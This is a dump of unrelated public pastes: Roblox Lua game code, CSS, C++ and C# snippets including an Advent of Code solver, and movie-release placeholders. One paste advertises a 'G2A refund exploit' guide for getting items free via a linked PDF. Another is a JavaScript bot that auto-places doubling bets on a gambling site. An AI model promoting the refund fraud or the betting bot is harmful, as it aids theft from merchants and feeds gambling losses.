Weld48.C0 = CFrame.new(-0.548706055, -1.85446632, -0.876541138, 0.777180314, -0.318972021, -0.542446673, -0.107407324, -0.916601241, 0.385100871, -0.620041311, -0.241031379, -0.746623755)
Weld48.Part0 = Part1
Weld48.Part1 = Part94
Part49.Parent = Model0
Part49.Size = Vector3.new(1.979520320892334, 1.1499688625335693, 0.9416950345039368)
Part49.BrickColor = BrickColor.new(""Dark stone grey"")
Part49.Material = Enum.Material.Limestone
Part50.Parent = Model0
Part50.Size = Vector3.new(1.367323398590088, 0.9008519649505615, 1.740330696105957)
Part50.BrickColor = BrickColor.new(""Dark stone grey"")
Part50.Material = Enum.Material.Limestone
Part51.Parent = Model0
Part51.Size = Vector3.new(0.9675408005714417, 1.621850609779358, 1.3660805225372314)
Part51.BrickColor = BrickColor.new(""Dark stone grey"")
Part51.Material = Enum.Material.Limestone
Part52.Parent = Model0
Part52.Size = Vector3.new(1.3825271129608154, 1.994309425354004, 0.7774818539619446)
Part52.BrickColor = BrickColor.new(""Dark stone grey"")
Part52.Material = Enum.Material.Limestone
Part53.Parent = Model0
Part53.Size = Vector3.new(1.2786664962768555, 0.8663254380226135, 1.9351648092269897)
Part53.BrickColor = BrickColor.new(""Dark stone grey"")
Part53.Material = Enum.Material.Limestone
Part54.Parent = Model0
Part54.Size = Vector3.new(0.9675408005714417, 1.621850609779358, 1.3660808801651)
Part54.BrickColor = BrickColor.new(""Dark stone grey"")
Part54.Material = Enum.Material.Limestone
Part55.Parent = Model0
Part55.Size = Vector3.new(0.790423572063446, 1.465881586074829, 1.8501102924346924)
Part55.BrickColor = BrickColor.new(""Dark stone grey"")
Part55.Material = Enum.Material.Limestone
Part56.Parent = Model0
Part56.Size = Vector3.new(1.6456003189086914, 1.1885193586349487, 1.0960382223129272)
Part56.BrickColor = BrickColor.new(""Dark stone grey"")
Part56.Material = Enum.Material.Limestone
Part57.Parent = Model0
Part57.Size = Vector3.new(0.9281229376792908, 1.8953975439071655, 1.218570351600647)
Part57.BrickColor = BrickColor.new(""Dark stone grey"")
Part57.Material = Enum.Material.Limestone
Part58.Parent = Model0
Part58.Size = Vector3.new(1.8447951078414917, 1.0458903312683105, 1.111020565032959)
Part58.BrickColor = BrickColor.new(""Dark stone grey"")
Part58.Material = Enum.Material.Limestone
Part59.Parent = Model0
Part59.Size = Vector3.new(1.1795203685760498, 0.9499688744544983, 0.9416950345039368)
Part59.BrickColor = BrickColor.new(""Dark stone grey"")
Part59.Material = Enum.Material.Limestone
Part60.Parent = Model0
Part60.Size = Vector3.new(0.9767622947692871, 1.2436875104904175, 1.7646404504776)
Part60.BrickColor = BrickColor.new(""Dark stone grey"")
Part60.Material = Enum.Material.Limestone
Part61.Parent = Model0
Part61.Size = Vector3.new(1.8447951078414917, 1.0458903312683105, 1.111020565032959)
Part61.BrickColor = BrickColor.new(""Dark stone grey"")
Part61.Material = Enum.Material.Limestone
Part62.Parent = Model0
Part62.Size = Vector3.new(0.9281229376792908, 1.8953975439071655, 1.218570351600647)
Part62.BrickColor = BrickColor.new(""Dark stone grey"")
Part62.Material = Enum.Material.Limestone
Part63.Parent = Model0
Part63.Size = Vector3.new(1.2786664962768555, 0.8663254380226135, 1.9351648092269897)
Part63.BrickColor = BrickColor.new(""Dark stone grey"")
Part63.Material = Enum.Material.Limestone
Part64.Parent = Model0
Part64.Size = Vector3.new(1.367323398590088, 0.9008519649505615, 1.740330696105957)
Part64.BrickColor = BrickColor.new(""Dark stone grey"")
Part64.Material = Enum.Material.Limestone
Part65.Parent = Model0
Part65.Size = Vector3.new(1.979520320892334, 1.1499688625335693, 0.9416950345039368)
Part65.BrickColor = BrickColor.new(""Dark stone grey"")
Part65.Material = Enum.Material.Limestone
Part66.Parent = Model0
Part66.Size = Vector3.new(1.979520320892334, 1.1499688625335693, 0.9416951537132263)
Part66.BrickColor = BrickColor.new(""Dark stone grey"")
Part66.Material = Enum.Material.Limestone
Part67.Parent = Model0
Part67.Size = Vector3.new(1.6456003189086914, 1.1885193586349487, 1.0960382223129272)
Part67.BrickColor = BrickColor.new(""Dark stone grey"")
Part67.Material = Enum.Material.Limestone
Part68.Parent = Model0
Part68.Size = Vector3.new(1.060845971107483, 1.743768334388733, 1.158818244934082)
Part68.BrickColor = BrickColor.new(""Dark stone grey"")
Part68.Material = Enum.Material.Limestone
Part69.Parent = Model0
Part69.Size = Vector3.new(0.9675408005714417, 1.621850609779358, 1.3660805225372314)
Part69.BrickColor = BrickColor.new(""Dark stone grey"")
Part69.Material = Enum.Material.Limestone
Part70.Parent = Model0
Part70.Size = Vector3.new(0.8989728093147278, 1.4070851802825928, 1.6946868896484375)
Part70.BrickColor = BrickColor.new(""Dark stone grey"")
Part70.Material = Enum.Material.Limestone
Part71.Parent = Model0
Part71.Size = Vector3.new(1.540067195892334, 1.3940503597259521, 0.9984775185585022)
Part71.BrickColor = BrickColor.new(""Dark stone grey"")
Part71.Material = Enum.Material.Limestone
Part72.Parent = Model0
Part72.Size = Vector3.new(0.9675408005714417, 1.621850609779358, 1.3660805225372314)
Part72.BrickColor = BrickColor.new(""Dark stone grey"")
Part72.Material = Enum.Material.Limestone
Part73.Parent = Model0
Part73.Size = Vector3.new(0.7904235124588013, 1.46588134765625, 1.8501102924346924)
Part73.BrickColor = BrickColor.new(""Dark stone grey"")
Part73.Material = Enum.Material.Limestone
Part74.Parent = Model0
Part74.Size = Vector3.new(0.7760546207427979, 1.3811285495758057, 2)
Part74.BrickColor = BrickColor.new(""Dark stone grey"")
Part74.Material = Enum.Material.Limestone
Part75.Parent = Model0
Part75.Size = Vector3.new(0.7820842266082764, 1.5748226642608643, 1.7404885292053223)
Part75.BrickColor = BrickColor.new(""Dark stone grey"")
Part75.Material = Enum.Material.Limestone
Part76.Parent = Model0
Part76.Size = Vector3.new(1.3825271129608154, 1.994309425354004, 0.777481734752655)
Part76.BrickColor = BrickColor.new(""Dark stone grey"")
Part76.Material = Enum.Material.Limestone
Part77.Parent = Model0
Part77.Size = Vector3.new(1.1843007802963257, 1.8191449642181396, 0.9950092434883118)
Part77.BrickColor = BrickColor.new(""Dark stone grey"")
Part77.Material = Enum.Material.Limestone
Part78.Parent = Model0
Part78.Size = Vector3.new(0.7820842266082764, 1.5748226642608643, 1.7404885292053223)
Part78.BrickColor = BrickColor.new(""Dark stone grey"")
Part78.Material = Enum.Material.Limestone
Part79.Parent = Model0
Part79.Size = Vector3.new(0.9281229376792908, 1.8953975439071655, 1.218570351600647)
Part79.BrickColor = BrickColor.new(""Dark stone grey"")
Part79.Material = Enum.Material.Limestone
Part80.Parent = Model0
Part80.Size = Vector3.new(1.1795203685760498, 0.9499688744544983, 0.9416950345039368)
Part80.BrickColor = BrickColor.new(""Dark stone grey"")
Part80.Material = Enum.Material.Limestone
Part81.Parent = Model0
Part81.Size = Vector3.new(1.6790493726730347, 0.8663254976272583, 1.473709225654602)
Part81.BrickColor = BrickColor.new(""Dark stone grey"")
Part81.Material = Enum.Material.Limestone
Part82.Parent = Model0
Part82.Size = Vector3.new(0.9675408005714417, 1.621850609779358, 1.3660805225372314)
Part82.BrickColor = BrickColor.new(""Dark stone grey"")
Part82.Material = Enum.Material.Limestone
Part83.Parent = Model0
Part83.Size = Vector3.new(0.7820842266082764, 1.5748226642608643, 1.7404885292053223)
Part83.BrickColor = BrickColor.new(""Dark stone grey"")
Part83.Material = Enum.Material.Limestone
Part84.Parent = Model0
Part84.Size = Vector3.new(0.8989728093147278, 1.4070851802825928, 1.6946868896484375)
Part84.BrickColor = BrickColor.new(""Dark stone grey"")
Part84.Material = Enum.Material.Limestone
Part85.Parent = Model0
Part85.Size = Vector3.new(0.7904235124588013, 1.46588134765625, 1.8501102924346924)
Part85.BrickColor = BrickColor.new(""Dark stone grey"")
Part85.Material = Enum.Material.Limestone
Part86.Parent = Model0
Part86.Size = Vector3.new(1.060845971107483, 1.743768334388733, 1.158818244934082)
Part86.BrickColor = BrickColor.new(""Dark stone grey"")
Part86.Material = Enum.Material.Limestone
Part87.Parent = Model0
Part87.Size = Vector3.new(1.8447951078414917, 1.0458903312683105, 1.111020565032959)
Part87.BrickColor = BrickColor.new(""Dark stone grey"")
Part87.Material = Enum.Material.Limestone
Part88.Parent = Model0
Part88.Size = Vector3.new(1.367323398590088, 0.9008519649505615, 1.740330696105957)
Part88.BrickColor = BrickColor.new(""Dark stone grey"")
Part88.Material = Enum.Material.Limestone
Part89.Parent = Model0
Part89.Size = Vector3.new(1.540067195892334, 1.3940503597259521, 0.9984775185585022)
Part89.BrickColor = BrickColor.new(""Dark stone grey"")
Part89.Material = Enum.Material.Limestone
Part90.Parent = Model0
Part90.Size = Vector3.new(1.1322135925292969, 1.117563247680664, 1.6941659450531006)
Part90.BrickColor = BrickColor.new(""Dark stone grey"")
Part90.Material = Enum.Material.Limestone
Part91.Parent = Model0
Part91.Size = Vector3.new(1.979520320892334, 1.1499688625335693, 0.9416950345039368)
Part91.BrickColor = BrickColor.new(""Dark stone grey"")
Part91.Material = Enum.Material.Limestone
Part92.Parent = Model0
Part92.Size = Vector3.new(0.7760546207427979, 1.3811285495758057, 2)
Part92.BrickColor = BrickColor.new(""Dark stone grey"")
Part92.Material = Enum.Material.Limestone
Part93.Parent = Model0
Part93.Size = Vector3.new(1.3825271129608154, 1.994309425354004, 0.777481734752655)
Part93.BrickColor = BrickColor.new(""Dark stone grey"")
Part93.Material = Enum.Material.Limestone
Part94.Parent = Model0
Part94.Size = Vector3.new(1.1843007802963257, 1.8191449642181396, 0.9950092434883118)
Part94.BrickColor = BrickColor.new(""Dark stone grey"")
Part94.Material = Enum.Material.Limestone
Part95.Name = ""Handle""
Part95.Parent = mas
Part95.Size = Vector3.new(1, 5, 1)
Part95.Anchored = true
Part95.BrickColor = BrickColor.new(""Teal"")
Part95.CanCollide = false
Part95.Material = Enum.Material.Neon
SpecialMesh96.Name = ""SpecialMesh""
SpecialMesh96.Parent = Part95
SpecialMesh96.MeshId = ""rbxassetid://15722277995""
SpecialMesh96.TextureId = ""rbxassetid://14606728204""
SpecialMesh96.MeshType = Enum.MeshType.FileMesh
Decal97.Parent = Part95
Decal97.Texture = ""http://www.roblox.com/asset/?id=300461098""
for i,v in pairs(mas:GetChildren()) do
	v.Parent = workspace
end
task.wait()
for i, v in pairs(Model0:GetDescendants()) do
	if v:IsA(""Weld"") then
		v.Part1.Anchored = true
		v.Part1.CanTouch = false
		v.Part1.CanQuery = false
		v:Destroy()
	end
end
Part1.CanTouch = false
Part1.CanQuery = false
Part95.Parent = Model0
Part95.CFrame = CFrame.new(-0.364652783, 2.6707685, 13.9806728, -0.291621953, 0.0909768045, 0.952197492, 0.651633918, -0.70984149, 0.26739186, 0.700235605, 0.698461473, 0.147721767)
mas:Destroy()

local swordpull = {
	[1] = {
		[""Torso""] = {
			[""Left Leg""] = CFrame.new(-0.91,-0.12,0) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(43.58)),
			[""Right Arm""] = CFrame.new(0.62,-0.13,-0.1) * CFrame.Angles(math.rad(-8.08),math.rad(29.11),math.rad(92.47)),
			[""Head""] = CFrame.Angles(math.rad(16.21),math.rad(-0.25),math.rad(-12.96)),
			[""Left Arm""] = CFrame.new(-0.74,-0.37,-0.48) * CFrame.Angles(math.rad(-25),math.rad(-50.04),math.rad(-112.88)),
			[""Right Leg""] = CFrame.new(0.44,0.03,0) * CFrame.Angles(math.rad(0),math.rad(-0),math.rad(-24.59)),
			[""CFrame""] = CFrame.new(0,-0.94,0.53) * CFrame.Angles(math.rad(-49.74),math.rad(0),math.rad(0))
		},
	},
	[2] = {
		[""Torso""] = {
			[""Left Leg""] = CFrame.new(0.16,0.26,0) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(19.52)),
			[""Right Arm""] = CFrame.new(0.24,-0.22,-0.25) * CFrame.Angles(math.rad(-8.08),math.rad(29.11),math.rad(92.47)),
			[""Head""] = CFrame.Angles(math.rad(-9.98),math.rad(5.58),math.rad(-11.72)),
			[""Left Arm""] = CFrame.new(-0.36,-0.46,-0.34) * CFrame.Angles(math.rad(-24.99),math.rad(-50.04),math.rad(-112.88)),
			[""Right Leg""] = CFrame.new(0.22,0.13,0) * CFrame.Angles(math.rad(0),math.rad(-0),math.rad(-24.59)),
			[""CFrame""] = CFrame.new(0,-0.94,0.53) * CFrame.Angles(math.rad(-77.08),math.rad(0),math.rad(0))
		},
	},
	[3] = {
		[""Torso""] = {
			[""Left Leg""] = CFrame.new(0.16,0.26,0) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(19.52)),
			[""Right Arm""] = CFrame.new(0.24,-0.22,-0.25) * CFrame.Angles(math.rad(-8.08),math.rad(29.11),math.rad(92.47)),
			[""Head""] = CFrame.Angles(math.rad(-9.98),math.rad(5.58),math.rad(-11.72)),
			[""Left Arm""] = CFrame.new(-0.36,-0.46,-0.34) * CFrame.Angles(math.rad(-24.99),math.rad(-50.04),math.rad(-112.88)),
			[""Right Leg""] = CFrame.new(0.22,0.13,0) * CFrame.Angles(math.rad(0),math.rad(-0),math.rad(-24.59)),
			[""CFrame""] = CFrame.new(0,-0.94,0.53) * CFrame.Angles(math.rad(-77.08),math.rad(0),math.rad(0))
		},
	},
	[0] = {
		[""Torso""] = {
			[""Left Leg""] = CFrame.new(-0.91,-0.12,0) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(43.58)),
			[""Right Arm""] = CFrame.new(0.46,0.17,-0.04) * CFrame.Angles(math.rad(-17.25),math.rad(34.21),math.rad(108.85)),
			[""Head""] = CFrame.Angles(math.rad(1.81),math.rad(-0.19),math.rad(-0.27)),
			[""Left Arm""] = CFrame.new(-0.52,0.24,-0.44) * CFrame.Angles(math.rad(-28.08),math.rad(-48.56),math.rad(-111.6)),
			[""Right Leg""] = CFrame.new(0.44,0.03,0) * CFrame.Angles(math.rad(0),math.rad(-0),math.rad(-24.59)),
			[""CFrame""] = CFrame.new(0,-0.94,0.53) * CFrame.Angles(math.rad(-23.85),math.rad(0),math.rad(0))
		},
	}
}
--local t = os.clock()
local curranimation = -1

local character = owner.Character
local hrp = character.HumanoidRootPart

local function weld(name,parent,part0,part1,c0,c1)
	local weld = Instance.new(""Weld"")
	weld.Name = name
	weld.Part0 = part0
	weld.Part1 = part1
	weld.C0 = c0
	weld.C1 = c1
	weld.Parent = parent
	return weld
end

local welds = {}
local weldspos = {}

for i, v in pairs(character:GetDescendants()) do
	if v:IsA(""Motor6D"") then
		welds[v.Part1.Name] = weld(v.Name,v.Parent,v.Part0,v.Part1,v.C0,v.C1)
		weldspos[v.Part1.Name] = welds[v.Part1.Name].C0
	end
end

game:GetService(""RunService"").Heartbeat:Connect(function(delta)
	--t += (delta * 60)
	
	if swordpull[curranimation] == -1 then
		for i, v in pairs(welds) do
			v.Enabled = false
		end
		for i, v in pairs(swordpull[0].Torso) do
			if welds[i] then
				welds[i].C0 = welds[i].C0:Lerp(weldspos[i],.2)
			elseif i == ""CFrame"" then
				welds[""Torso""].C0 = welds[""Torso""].C0:Lerp(weldspos[""Torso""],.2)
			end
		end
		return
	else
		for i, v in pairs(welds) do
			v.Enabled = true
		end
	end
	
	for i, v in pairs(swordpull[curranimation].Torso) do
		if welds[i] then
			welds[i].C0 = welds[i].C0:Lerp(weldspos[i] * v,.2)
		elseif i == ""CFrame"" then
			welds[""Torso""].C0 = welds[""Torso""].C0:Lerp(weldspos[""Torso""] * v,.2)
		end
	end
end)

local proximity = Instance.new(""ProximityPrompt"",Part95)

proximity.Triggered:Connect(function(plr)
	if plr ~= owner then
		if plr.Character.Humanoid.Health <= 0 then return end
		plr.Character.Humanoid:TakeDamage(100)
		local p = Instance.new(""Part"")
		p.Anchored = true
		p.Material = ""Neon""
		p.Color = Color3.fromRGB(152, 194, 219)
		p.Size = Vector3.new(10,200,10)
		p.CFrame = plr.Character.HumanoidRootPart.CFrame
		p.Parent = Script98
		game:GetService(""TweenService""):Create(p,TweenInfo.new(1),{Transparency = 1,Size = p.Size + Vector3.new(5,0,5)}):Play()
		game:GetService(""Debris""):AddItem(p,1)
		local s = Instance.new(""Sound"")
		s.SoundId = ""rbxassetid://9113966461""
		s.PlayOnRemove = true
		s.Parent = p
		s:Destroy()
		return
	end
	proximity.Enabled = false
	print(""triggering"")
	hrp.Anchored = true
	hrp.CFrame = Part1.CFrame * CFrame.new(0,0,5.5)
	curranimation = 0
	while task.wait(1) do
		if swordpull[curranimation + 1] then
			curranimation += 1
		else
			break
		end
	end
end)"
xvveWr0e,Ostwind.V.Deu.1080p.h264.dts.Subs-bp,bpmircea,BrainFuck,Sunday 24th of December 2023 03:54:59 AM CDT,"Ostwind - Der große Orkan (Windstorm: The Great Hurricane) (Lea Schmidbauer, 2021)
aka
Ostwind.V.Deu.1080p.h264.dts.Subs-bp
https://www.imdb.com/title/tt11560730/

Uploading..."
AXe5i1M2,Untitled,antitoxical,C++,Sunday 24th of December 2023 03:53:13 AM CDT,"void Asteroid::AddNew_Asteroid(sf::Vector2f scale, sf::Vector2f asteroid_pos, int levelprev, float angle_prev)
{
	asteroid = asteroid;
	level = levelprev;

	if (level >= 0)
	{
		std::cout << level << std::endl;
	}

	if (level <= 0)
	{
		is_alive = false;
		return;
	}
	std::cout << ""level: "" << level << std::endl;

	//set scale
	scale.x = scale.x;
	scale.y = scale.y;
	asteroid.setScale(scale);


	//set position
	asteroid.setPosition(asteroid_pos);
	std::cout << ""x: "" << asteroid_pos.x << "" "" << ""y: "" << asteroid_pos.y << std::endl;

	//set direction
	angle = rand() % 360;
	if (angle >= angle_prev - 10 || angle <= angle_prev + 10)
		angle = rand() % 360;

	std::cout << ""angle:"" << angle << std::endl;

	direction.x = -cos(m_math->Deg2Rad(angle));
	direction.y = sin(m_math->Deg2Rad(angle));
}"
BEfi4PKx,G2A.com Refund Exploit Dec 2023,G2ARefundExploit,GetText,Sunday 24th of December 2023 03:53:07 AM CDT,"G2A refund exploit updated guide - any item for free on G2A.com

https://drive.google.com/file/d/1AKxSk9vs38aBF7GEDJxf8mNi-_NVRLQ9/view#g2a_refund_exploit.pdf

Working as of 
22 December 2023

813887"
YvHqUFih,MemberPress Courses,nakib4tech,HTML,Sunday 24th of December 2023 03:45:16 AM CDT,"<style>
body {
font-family: -apple-system,system-ui,BlinkMacSystemFont,""Segoe UI"",Roboto,""Helvetica Neue"",sans-serif !important;
font-size: .8rem !important;
}
#mpcs-main {
margin-left: unset !important;
margin-right: auto;
}
h1.entry-title {
margin-bottom: 1em;
}
#mpcs-main #bookmark a {
margin-left: .5em;
margin-right: 0 !important;
padding-right: 0.5rem !important;
padding-left: 0 !important;
}
.mpcs-sidebar-wrapper .mpcs-lesson i.mpcs-doc-text-inv {
margin-left: 3px;
margin-right: 0 !important;
}
.mpcs-sidebar-wrapper .mpcs-lesson .mpcs-lesson-link {
margin-left: 0 !important;
margin-right: 6px;
}
#mpcs-main a.btn.btn-green {
    color: white;
}
.mpcs-sidebar-wrapper h1 {
font-family: -apple-system,BlinkMacSystemFont,""Segoe UI"",Roboto,Helvetica,Arial,sans-serif,""Apple Color Emoji"",""Segoe UI Emoji"",""Segoe UI Symbol"";
}
#mpcs-main h1,h2 {
font-family: -apple-system,BlinkMacSystemFont,""Segoe UI"",Roboto,Helvetica,Arial,sans-serif,""Apple Color Emoji"",""Segoe UI Emoji"",""Segoe UI Symbol"" !important;
}
#mpcs-sidebar .mpcs-sidebar-menu a.is-active {
border-right: 5px solid #2b3637;
border-left: none !important;
}
.mpcs-lesson .btn {
line-height: 0.8rem !important;
}
.mpcs-lesson .mpcs-lesson-button {
margin-right: auto;
margin-left: 0 !important;
}
@media (max-width: 600px) {
#mpcs-sidebar {
left: unset !important;
	right: 0;
}
}
.mpcs-lesson .mpcs-lesson-link {
    margin-left: 5px !important;
    margin-right: 8px;
}
.mpcs-right-big:before, .mpcs-left-big:before {
    transform: rotate(
180deg);
}
.mpcs-angle-circled-left:before {
    transform: rotate(
180deg);
}
.mpcs-angle-right:before {
transform: rotate(
180deg);
}
.mpcs-sidebar-with-accordion #mpcs-sidebar .mpcs-section-header:after {
left: 20px;
right: unset !important;
}
.dropdown.dropdown-right .menu {
left: 0 !important;
right: auto !important;
}
</style>"
SCBqgiTf,Ostwind.IV.Deu.1080p.h264.dts.Subs-bp,bpmircea,BrainFuck,Sunday 24th of December 2023 03:44:53 AM CDT,"Ostwind - Aris Ankunft (Windstorm 4: Ari's Arrival) (Theresa von Eltz, 2019)
aka
Ostwind.IV.Deu.1080p.h264.dts.Subs-bp
https://www.imdb.com/title/tt9182284/

Uploading..."
WCLZeAvJ,MemberPress Forms RTL,nakib4tech,HTML,Sunday 24th of December 2023 03:43:07 AM CDT,"<style>
.mepr-account-container #mepr-account-nav {
background: #344499 !important;
}
.mp_wrapper form {
margin-bottom: 0;
}
.mp-form-label {
line-height: 2.6;
}
.mp_wrapper form {
    text-align: right;
}
#mepr-account-nav .mepr-nav-item a:before {
margin-right: unset !important;
margin-left:10px;
}
.mp_wrapper table.mepr-account-table td {
font-size: 15px;
}
@media screen and (min-width: 840px){
#mepr-account-nav .mepr-nav-item a {
justify-content: right !important;
}
}
table.mp-table th {
    text-align: right;
}
table.mp-table {
    margin-bottom: 0;
}
.mp_wrapper table.mepr-account-table td {
    text-align: center;
}
.mp_wrapper table.mepr-account-table td:before {
    float: right;
}
.button.mp-hide-pw {
left: 0;
right:unset !important;
}
@media screen and (min-width: 915px){
.mepr-profile-wrapper__footer>*+* {
margin-left: unset !important;
margin-right: 10px;
}
}
</style>"
bjUAXFbV,Ostwind.III.Deu.1080p.h264.dts.Subs-bp,bpmircea,BrainFuck,Sunday 24th of December 2023 03:29:47 AM CDT,"Ostwind 3 - Aufbruch nach Ora (Windstorm and the Wild Horses) (Katja von Garnier, 2017)
aka
Ostwind.III.Deu.1080p.h264.dts.Subs-bp
https://www.imdb.com/title/tt5311972/

Uploading..."
1R7FGi1E,code,Newbie_dis,Lua,Sunday 24th of December 2023 03:28:14 AM CDT,Beep(1)
fkpZWn8X,Advent of Code 2023 - Day 24,mgla,C#,Sunday 24th of December 2023 03:13:08 AM CDT,"using Microsoft.Z3;

var input = File.ReadAllLines(""input.txt"");

var min = 200000000000000.0;
var max = 400000000000000.0;

var hails = new List<Hail>();

foreach (var line in input)
{
    var split = line.Split('@', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
    
    var position = split[0].Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries)
        .Select(double.Parse).ToArray();
    var velocity = split[1].Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries)
        .Select(double.Parse).ToArray();

    var hail = new Hail(
        new Position(position[0], position[1], position[2]),
        new Position(velocity[0], velocity[1], velocity[2]));
    
    var next = hail.Move();
    
    // We calculate the line equation for the hail's path and store it in the hail object.
    var slope = (next.Position.Y - hail.Position.Y) / (next.Position.X - hail.Position.X);
    var intercept = next.Position.Y - slope * next.Position.X;

    hails.Add(hail with { Slope = slope, Intersect = intercept });
}

var part1 = 0;
var visited = new HashSet<Hail>();
const int b = -1;
foreach (var first in hails)
{
    visited.Add(first);
    var a1 = first.Slope;
    var c1 = first.Intersect;
    var x1 = first.Position.X;
    var y1 = first.Position.Y;
    var vx1 = first.Velocity.X;
    var vy1 = first.Velocity.Y;

    foreach (var second in hails.Where(h => !visited.Contains(h)))
    {
        var a2 = second.Slope;
        var c2 = second.Intersect;
        var x2 = second.Position.X;
        var y2 = second.Position.Y;
        var vx2 = second.Velocity.X;
        var vy2 = second.Velocity.Y;

        if (a1 == a2)
        {
            continue; // Parallel
        }
        
        var x = (b * c2 - b * c1) / (a1 * b - a2 * b);
        var y = (a2 * c1 - a1 * c2) / (a1 * b - a2 * b);
        
        if (x - x1 < 0 != vx1 < 0 ||
            y - y1 < 0 != vy1 < 0)
        {
            continue; // Opposite to first's direction
        }
        
        if (x - x2 < 0 != vx2 < 0 ||
            y - y2 < 0 != vy2 < 0)
        {
            continue; // Opposite to second's direction
        }
                
        if (new Position(x, y).InBounds(min, max))
        {
            part1++;
        }
    }
}

Console.WriteLine($""Part 1: {part1}"");
Console.WriteLine($""Part 2: {Solve(hails)}"");
return;

// Using Z3 to solve the system of equations. I wanted to do it without using any 3rd party libraries, but I gave up.
// Used this: https://github.com/Z3Prover/z3
static long Solve(List<Hail> hails)
{
    var ctx = new Context();
    var solver = ctx.MkSolver();

    // Coordinates of the stone
    var x = ctx.MkIntConst(""x"");
    var y = ctx.MkIntConst(""y"");
    var z = ctx.MkIntConst(""z"");

    // Velocity of the stone
    var vx = ctx.MkIntConst(""vx"");
    var vy = ctx.MkIntConst(""vy"");
    var vz = ctx.MkIntConst(""vz"");

    // For each iteration, we will add 3 new equations and one new condition to the solver.
    // We want to find 9 variables (x, y, z, vx, vy, vz, t0, t1, t2) that satisfy all the equations, so a system of 9 equations is enough.
    for (var i = 0; i < 3; i++)
    {
        var t = ctx.MkIntConst($""t{i}""); // time for the stone to reach the hail
        var hail = hails[i];

        var px = ctx.MkInt(Convert.ToInt64(hail.Position.X));
        var py = ctx.MkInt(Convert.ToInt64(hail.Position.Y));
        var pz = ctx.MkInt(Convert.ToInt64(hail.Position.Z));
        
        var pvx = ctx.MkInt(Convert.ToInt64(hail.Velocity.X));
        var pvy = ctx.MkInt(Convert.ToInt64(hail.Velocity.Y));
        var pvz = ctx.MkInt(Convert.ToInt64(hail.Velocity.Z));
        
        var xLeft = ctx.MkAdd(x, ctx.MkMul(t, vx)); // x + t * vx
        var yLeft = ctx.MkAdd(y, ctx.MkMul(t, vy)); // y + t * vy
        var zLeft = ctx.MkAdd(z, ctx.MkMul(t, vz)); // z + t * vz

        var xRight = ctx.MkAdd(px, ctx.MkMul(t, pvx)); // px + t * pvx
        var yRight = ctx.MkAdd(py, ctx.MkMul(t, pvy)); // py + t * pvy
        var zRight = ctx.MkAdd(pz, ctx.MkMul(t, pvz)); // pz + t * pvz

        solver.Add(t >= 0); // time should always be positive - we don't want solutions for negative time
        solver.Add(ctx.MkEq(xLeft, xRight)); // x + t * vx = px + t * pvx
        solver.Add(ctx.MkEq(yLeft, yRight)); // y + t * vy = py + t * pvy
        solver.Add(ctx.MkEq(zLeft, zRight)); // z + t * vz = pz + t * pvz
    }

    solver.Check();
    var model = solver.Model;

    var rx = model.Eval(x);
    var ry = model.Eval(y);
    var rz = model.Eval(z);

    return Convert.ToInt64(rx.ToString()) + Convert.ToInt64(ry.ToString()) + Convert.ToInt64(rz.ToString());
}

internal record Position(double X, double Y, double Z = 0)
{
    public Position Move(double x, double y, double z) => new(X + x, Y + y, Z + z);
    public bool InBounds(double min, double max) => X >= min && X <= max && Y >= min && Y <= max;
}

internal record Hail(Position Position, Position Velocity, double Slope = 0, double Intersect = 0)
{
    public Hail Move() => this with { Position = Position.Move(Velocity.X, Velocity.Y, Velocity.Z) };
}"
igu4KYkW,Ostwind.II.Deu.1080p.h264.dts.Subs-bp,bpmircea,BrainFuck,Sunday 24th of December 2023 03:10:50 AM CDT,"Ostwind 2 (Windstorm 2) (Katja von Garnier, 2015)
aka
Ostwind.II.Deu.1080p.h264.dts.Subs-bp
https://www.imdb.com/title/tt3849938/

Uploading..."
QN2Md00H,for amanku for christmas,coinwalk,JavaScript,Sunday 24th of December 2023 03:08:03 AM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var base = (oldestbal/100); //dont change;
var bellance = oldestbal;
var botplus = base;
var trget = parseFloat(oldestbal);
var tens = (base*10);
var sevens = (base*6.9);
var eights  = (base*7.1)
var floatingbal = 0;
var betnext = ((botplus*1).toFixed(8));

 
function get(){
bellance = document.getElementById('pct_balance').value;
if ((bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))&&(bellance!=floatingbal)) {
     botplus = botplus*2;    
     floatingbal  = parseFloat(bellance);
}
if ((((bellance-(oldestbal-(tens*2)))-(botplus*2))<=0)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    floatingbal = 0; 
}
if (((botplus*2)>=tens)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    floatingbal = 0;
    oldestbal = parseFloat(((Math.floor(bellance/tens))*tens));
}
if ((((bellance-(oldestbal-(tens*2)))-(botplus*2))<=0)&&(bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))){
    botplus = base*2;
    floatingbal  = parseFloat(bellance);
}
if ((bellance-(oldestbal-(tens)))<=0){
oldestbal = parseFloat(((Math.floor(bellance/tens))*tens));
botplus = base;
floatingbal = 0;
}
if (bellance>=(trget*2.4)){
oldestbal = parseFloat(bellance);
base = (oldestbal/100); //dont change;
botplus = base;
tens = (base*10);
sevens = (base*6.9);
eights  = (base*7.1)
floatingbal = 0;
trget = parseFloat(oldestbal);
}
if (bellance>80000){
console.log(""buy ebike"")
return
}
betnext = ((botplus*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(betnext);
$('#a_hi').click();
setTimeout(() => get(), 1000);
}
get();"
zv7rhRRB,link list,excellent940707,C++,Sunday 24th of December 2023 03:00:55 AM CDT,"#include <bits/stdc++.h>
using namespace std;
// Node structure
struct Node
{
    int data;
    Node* next;
};

// Function to insert a node at the appropriate position in sorted order
void insertSorted(Node*& head, int value) {
    Node *now = new Node;
    now->data = value;
    now->next = head;
    head = now;
    while(now->next != nullptr){
        if(now->data > now->next->data){
            swap(now->data, now->next->data);
        }
        now = now->next;
    }
}

// Function to delete the first occurrence of a node with the given value
void deleteNode(Node*& head, int value) {
    if(head==nullptr)return ;
    if(head->data==value){
        head = head->next;
        return;
    }
